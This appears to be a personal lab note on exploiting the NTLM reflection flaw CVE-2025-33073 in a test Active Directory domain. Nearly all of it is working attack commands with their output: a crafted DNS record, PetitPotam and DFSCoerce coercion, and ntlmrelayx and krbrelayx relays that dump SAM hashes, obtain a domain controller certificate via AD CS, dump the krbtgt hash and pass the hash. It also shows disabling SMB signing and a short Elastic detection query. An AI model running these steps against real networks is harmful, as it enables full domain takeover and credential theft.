
# Theory 


# Setup

Alternatively, use elevated PowerShell to run `Set-SmbClientConfiguration -RequireSecuritySignature $false` and `Set-SmbServerConfiguration -RequireSecuritySignature $false` on domain controllers and member servers, respectively




## Exploitation


```
kali@kali ~/t/krbrelayx (master)> python dnstool.py   \
                                                                                      -u 'probatio.localis\SawyerUser' \
                                                                                      -p 'password' \
                                                                                      -a 'add' \
                                                                                      -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' \
                                                                                      -d '192.168.3.137' \
                                                                                      -dns-ip 10.3.10.11 \
                                                                                      --tcp SAWYER-DC01-202.probatio.localis
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```


```python
kali@kali ~/t/krbrelayx (master)> dig localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.probatio.localis @SAWYER-DC01-202.probatio.localis

; <<>> DiG 9.20.11-4-Debian <<>> localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.probatio.localis @SAWYER-DC01-202.probatio.localis
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 13569
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.probatio.localis.        IN A

;; ANSWER SECTION:
localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.probatio.localis. 180 IN A 192.168.3.137

;; Query time: 4 msec
;; SERVER: 10.3.10.11#53(SAWYER-DC01-202.probatio.localis) (UDP)
;; WHEN: Thu Oct 16 19:28:02 UTC 2025
;; MSG SIZE  rcvd: 115
```



```python
kali@kali ~/t/PetitPotam (main)> python PetitPotam.py -d 'probatio.localis' -u 'SawyerAdmin' -p 'password' localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA SAWYER-DC01-202.probatio.localis
/home/kali/tools/PetitPotam/PetitPotam.py:23: SyntaxWarning: invalid escape sequence '\ '
  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:SAWYER-DC01-202.probatio.localis[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```



```python
kali@kali ~> ntlmrelayx.py -smb2support -t smb://SAWYER-DC01-202.probatio.localis -smb2support --keep-relaying                                                                                                                               
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package i
s slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.                 
  import pkg_resources                                                                                                                                                                                                                       
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
                                                           
[*] Protocol Client DCSYNC loaded..                                                                                                                                                                                                          
[*] Protocol Client SMTP loaded..                          
[*] Protocol Client RPC loaded..                                                                                                                                                                                                             
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 192.168.3.133, attacking target smb://SAWYER-DC01-202.probatio.localis
[*] Authenticating against smb://SAWYER-DC01-202.probatio.localis as / SUCCEED
[*] SMBD-Thread-7 (process_request_thread): Received connection from 192.168.3.133, attacking target smb://SAWYER-DC01-202.probatio.localis
[*] Authenticating against smb://SAWYER-DC01-202.probatio.localis as / SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[-] 'CurrentState'                                         
[*] Target system bootKey: 0x9bc430adbea1daf6f91567c7210eb9f0
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Done dumping SAM hashes for host: sawyer-dc01-202.probatio.localis
[*] Stopping service RemoteRegistry
Exception in thread Thread-6:
Traceback (most recent call last):
```





## Alternatives

```
kali@kali ~/t/PetitPotam (main)> nxc smb SAWYER-DC01-202.probatio.localis -u 'SawyerUser' -p 'password'  smb-timeout 60 -M coerce_plus -o L='localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' ALWAYS=true
SMB         10.3.10.11      445    SAWYER-DC01-202  [*] Windows Server 2022 Build 20348 x64 (name:SAWYER-DC01-202) (domain:probatio.localis) (signing:False) (SMBv1:None)
SMB         10.3.10.11      445    SAWYER-DC01-202  [+] probatio.localis\SawyerUser:password 
COERCE_PLUS 10.3.10.11      445    SAWYER-DC01-202  VULNERABLE, DFSCoerce
COERCE_PLUS 10.3.10.11      445    SAWYER-DC01-202  Exploit Success, netdfs\NetrDfsRemoveRootTarget
COERCE_PLUS 10.3.10.11      445    SAWYER-DC01-202  Exploit Success, netdfs\NetrDfsAddStdRoot
COERCE_PLUS 10.3.10.11      445    SAWYER-DC01-202  Exploit Success, netdfs\NetrDfsRemoveStdRoot
COERCE_PLUS 10.3.10.11      445    SAWYER-DC01-202  VULNERABLE, PetitPotam
COERCE_PLUS 10.3.10.11      445    SAWYER-DC01-202  Exploit Success, efsrpc\EfsRpcAddUsersToFile
COERCE_PLUS 10.3.10.11      445    SAWYER-DC01-202  Exploit Success, efsrpc\EfsRpcAddUsersToFileEx
COERCE_PLUS 10.3.10.11      445    SAWYER-DC01-202  Exploit Success, efsrpc\EfsRpcDecryptFileSrv
COERCE_PLUS 10.3.10.11      445    SAWYER-DC01-202  Exploit Success, efsrpc\EfsRpcDuplicateEncryptionInfoFile
COERCE_PLUS 10.3.10.11      445    SAWYER-DC01-202  Exploit Success, efsrpc\EfsRpcEncryptFileSrv
COERCE_PLUS 10.3.10.11      445    SAWYER-DC01-202  Exploit Success, efsrpc\EfsRpcEncryptFileSrv
COERCE_PLUS 10.3.10.11      445    SAWYER-DC01-202  Exploit Success, efsrpc\EfsRpcFileKeyInfo
COERCE_PLUS 10.3.10.11      445    SAWYER-DC01-202  Exploit Success, efsrpc\EfsRpcQueryRecoveryAgents
COERCE_PLUS 10.3.10.11      445    SAWYER-DC01-202  Exploit Success, efsrpc\EfsRpcQueryUsersOnFile
COERCE_PLUS 10.3.10.11      445    SAWYER-DC01-202  Exploit Success, efsrpc\EfsRpcOpenFileRaw
```




# Elastic Logs



![[NTLM reflection CVE-2025-33073-20251016233221504.webp|1263]]



```
(dns.question.type : "A" and dns.question.name : *1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA*)
```


---

# Reflecting to Certificate Authority (Self-Relay)



```
kali@kali ~/t/krbrelayx (master)> python dnstool.py  -u 'probatio.localis\SawyerUser'  -p 'password'  -a 'add' -r 'SAWYER-DC011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' -d 'ATTACKER_IP' -dns-ip 'DC01_IP_HERE' --tcp SAWYER-DC01.probatio.localis -a modify
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Modifying record
[+] LDAP operation completed successfully
```


```
kali@kali ~/t/PetitPotam (main)> python PetitPotam.py -d 'probatio.localis' -u 'SawyerUser' -p 'password' SAWYER-DC011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA SAWYER-DC01.probatio.localis
/home/kali/tools/PetitPotam/PetitPotam.py:23: SyntaxWarning: invalid escape sequence '\ '
  | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:SAWYER-DC01.probatio.localis[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```



```
kali@kali ~/t/krbrelayx (master)> python krbrelayx.py --target 'http://SAWYER-DC01.PROBATIO.LOCALIS/certsrv/certfnsh.asp' --adcs --template 'DomainController' --victim 'SAWYER-DC01$'
[*] Protocol Client SMB loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Running in attack mode to single host
[*] Running in kerberos relay mode because no credentials were specified.
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up DNS Server

[*] Servers started, waiting for connections
[*] SMBD: Received connection from 192.168.3.133
[*] HTTP server returned status code 200, treating as a successful login
[*] SMBD: Received connection from 192.168.3.133
[*] HTTP server returned status code 200, treating as a successful login
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 6
[*] Writing PKCS#12 certificate to ./SAWYER-DC01$.pfx  <------------------------------------
[*] Certificate successfully written to file
[*] Skipping user SAWYER-DC01$ since attack was already performed
```


```
kali@kali ~/t/krbrelayx (master)> nxc smb SAWYER-DC01.PROBATIO.LOCALIS -u 'SAWYER-DC01$' --pfx-cert 'SAWYER-DC01$.pfx'
SMB         10.3.10.11      445    SAWYER-DC01      [*] Windows Server 2022 Build 20348 x64 (name:SAWYER-DC01) (domain:probatio.localis) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.3.10.11      445    SAWYER-DC01      [+] probatio.localis\SAWYER-DC01$:821190da279104fc7753bbe524fe0892 
kali@kali ~/t/krbrelayx (master)> nxc smb SAWYER-DC01.PROBATIO.LOCALIS -u 'SAWYER-DC01$' --pfx-cert 'SAWYER-DC01$.pfx' --ntds --user 'krbtgt'
SMB         10.3.10.11      445    SAWYER-DC01      [*] Windows Server 2022 Build 20348 x64 (name:SAWYER-DC01) (domain:probatio.localis) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.3.10.11      445    SAWYER-DC01      [+] probatio.localis\SAWYER-DC01$:821190da279104fc7753bbe524fe0892 
SMB         10.3.10.11      445    SAWYER-DC01      [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         10.3.10.11      445    SAWYER-DC01      [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.3.10.11      445    SAWYER-DC01      krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1818608c54b272d522da536d0a7e75a2:::
SMB         10.3.10.11      445    SAWYER-DC01      [+] Dumped 1 NTDS hashes to /home/kali/.nxc/logs/ntds/SAWYER-DC01.PROBATIO.LOCALIS_None_2025-10-17_170240.ntds of which 1 were added to the database
```


# Retrieving NTLM HASH

```
kali@kali ~/t/krbrelayx (master)> certipy auth -pfx 'SAWYER-DC01$.pfx' -dc-ip '10.3.10.11'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'SAWYER-DC01.probatio.localis'
[*] Using principal: 'sawyer-dc01$@probatio.localis'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'sawyer-dc01.ccache'
[*] Wrote credential cache to 'sawyer-dc01.ccache'
[*] Trying to retrieve NT hash for 'sawyer-dc01$'
[*] Got hash for 'sawyer-dc01$@probatio.localis': aad3b435b51404eeaad3b435b51404ee:821190da279104fc7753bbe524fe0892
```


```
kali@kali ~/t/krbrelayx (master)> nxc smb SAWYER-DC01.PROBATIO.LOCALIS -u 'SAWYER-DC01$' -H 'aad3b435b51404eeaad3b435b51404ee:821190da279104fc7753bbe524fe0892'
SMB         10.3.10.11      445    SAWYER-DC01      [*] Windows Server 2022 Build 20348 x64 (name:SAWYER-DC01) (domain:probatio.localis) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.3.10.11      445    SAWYER-DC01      [+] probatio.localis\SAWYER-DC01$:821190da279104fc7753bbe524fe0892 
```


solution for problem

https://github.com/dirkjanm/krbrelayx/issues/57
https://github.com/fortra/impacket/issues/1716


![[NTLM reflection CVE-2025-33073-20251017203821115.webp|1002]]





## References

https://blog.async.sg/sysadmins-in-shambles
https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025
